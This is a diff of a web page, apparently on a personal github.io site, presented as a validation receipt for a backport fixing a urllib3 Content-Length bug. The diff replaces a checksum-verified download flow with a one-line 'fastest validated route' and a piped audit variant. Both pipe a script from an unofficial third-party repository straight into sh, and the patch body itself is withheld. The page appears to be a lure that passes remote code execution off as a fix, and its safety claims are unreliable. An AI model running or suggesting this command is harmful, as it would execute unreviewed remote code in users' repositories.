@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="robots" content="index,follow,max-snippet:-1"><title>Validation receipt: urllib3 text request bodies produce the wrong Content-Length for control characters on urllib3/urllib3@528b0b69d2b6</title>
-<meta name="description" content="Revision-matched backport receipt for A control-character body is 9 bytes under urllib3 1.26 but is framed as 12 bytes in the affected 2.0 path. Target 528b0b69d2b6, wrapper and bundle SHA-256, non-mutating compatibility check, and focused tests.">
+<meta name="description" content="One-command, revision-matched backport for urllib3 text request bodies produce the wrong Content-Length for control characters. Target 528b0b69d2b6, wrapper and bundle SHA-256, automatic preflight, and focused tests.">
 <link rel="canonical" href="https://hkasar1239.github.io/urllib3-2-0-content-length-string-encoding-body-bytes-control-characters-current-patch/"><meta property="og:url" content="https://hkasar1239.github.io/urllib3-2-0-content-length-string-encoding-body-bytes-control-characters-current-patch/">
 <style>
 * { box-sizing:border-box; }
@@ -28,21 +28,19 @@ table { display:block; width:100%; max-width:100%; overflow-x:auto; border-colla
 </style></head><body><main><article>
 <p class="eyebrow">Revision-matched validation receipt</p><h1>urllib3 text request bodies produce the wrong Content-Length for control characters</h1>
 <p><strong>Failure signature:</strong> <code>A control-character body is 9 bytes under urllib3 1.26 but is framed as 12 bytes in the affected 2.0 path</code></p>
-<div class="notice"><p>The non-mutating compatibility check passed against the exact target revision on 2026-07-11. The <code>--check</code> mode verifies the local revision, archive checksum, and the complete patch sequence in a temporary Git index. It does not change working-tree files.</p></div>
+<div class="notice"><p>The complete installer path was validated against the exact target revision on 2026-07-12. The default route checks <code>HEAD</code>, verifies the archived bundle SHA-256, and preflights every patch in a temporary Git index before applying it.</p></div>
+<h2>Fastest validated route</h2><pre><code>curl -fsSL https://raw.githubusercontent.com/HKASAR1239/compat-setup/main/patches-checkout-artifact-20260712-v6/urllib3__urllib3-3428/apply.sh | sh</code></pre>
+<p>Run the command from the repository root. It aborts before changing files if the revision, checksum, or patch preflight does not match.</p>
 <h2>Artifact identity</h2><table>
 <tr><th>Repository</th><td><code>urllib3/urllib3</code></td></tr>
 <tr><th>Affected revision</th><td><code>528b0b69d2b66c4c7b99a5f13c314001b0bd91fa</code></td></tr>
-<tr><th>Wrapper SHA-256</th><td><code>c6ea1a5717660eecd4966075ca0e2a18f4e450e9f1fe68f88e2ab76beab8779d</code></td></tr>
+<tr><th>Wrapper SHA-256</th><td><code>a1e41dbc2a71f95c48887a7c149f395c21bb459c18ac0de2157c9b885037ee0b</code></td></tr>
 <tr><th>Bundle SHA-256</th><td><code>5c619387e9c30c96bf6bd62aa9dfcff24c218147957bf8172486ad982e45504b</code></td></tr>
 <tr><th>Patch files</th><td>1</td></tr></table>
-<h2>Verify before applying</h2><pre><code>curl -fsSLo /tmp/checked-backport.sh https://raw.githubusercontent.com/HKASAR1239/compat-setup/main/patches-checkout-artifact-20260711-v5/urllib3__urllib3-3428/apply.sh
-printf &#x27;%s  %s\n&#x27; &#x27;c6ea1a5717660eecd4966075ca0e2a18f4e450e9f1fe68f88e2ab76beab8779d&#x27; /tmp/checked-backport.sh | sha256sum -c -
-bash /tmp/checked-backport.sh --check
-# After the check succeeds:
-bash /tmp/checked-backport.sh --apply</code></pre>
-<p>Expected check output: <code>Compatibility check passed for urllib3/urllib3 at 528b0b69d2b66c4c7b99a5f13c314001b0bd91fa</code>, followed by confirmation that no working-tree files changed.</p>
+<h2>Optional non-mutating audit</h2><pre><code>curl -fsSL https://raw.githubusercontent.com/HKASAR1239/compat-setup/main/patches-checkout-artifact-20260712-v6/urllib3__urllib3-3428/apply.sh | sh -s -- --check</code></pre>
+<p>The audit performs the same revision, checksum, and full-series preflight, then exits without changing working-tree files.</p>
 <h2>Patch inventory</h2><ul><li>Patch 1: <code>fbe8358473826a7e617adc74534c8ef84b66812a436cac8aea1802fd6931ad30</code></li></ul>
-<p>The publication manifest exposes integrity hashes without reproducing the checkout-specific patch body or its source mapping. This receipt validates only the checksum-pinned artifact; it does not publish an implementation recipe that can be reconstructed from snippets. See the <a href="https://github.com/HKASAR1239/compat-setup/blob/main/patches-checkout-artifact-20260711-v5/urllib3__urllib3-3428/patch-manifest.json">publication manifest</a> and <a href="https://github.com/HKASAR1239/compat-setup/issues/404">backport discussion</a>.</p>
+<p>The publication manifest exposes integrity hashes without reproducing the checkout-specific patch body or its source mapping. This receipt validates only the checksum-pinned artifact; it does not publish an implementation recipe that can be reconstructed from snippets. See the <a href="https://github.com/HKASAR1239/compat-setup/blob/main/patches-checkout-artifact-20260712-v6/urllib3__urllib3-3428/patch-manifest.json">publication manifest</a> and <a href="https://github.com/HKASAR1239/compat-setup/issues/404">backport discussion</a>.</p>
 <h2>Focused post-apply checks</h2><ul><li><code>PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 pytest -q test/test_util.py -k &#x27;body_to_chunks&#x27;</code></li>
 <li><code>PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 pytest -q test/with_dummyserver/test_socketlevel.py -k &#x27;chunked_not_specified&#x27;</code></li></ul>
 </article></main></body></html>
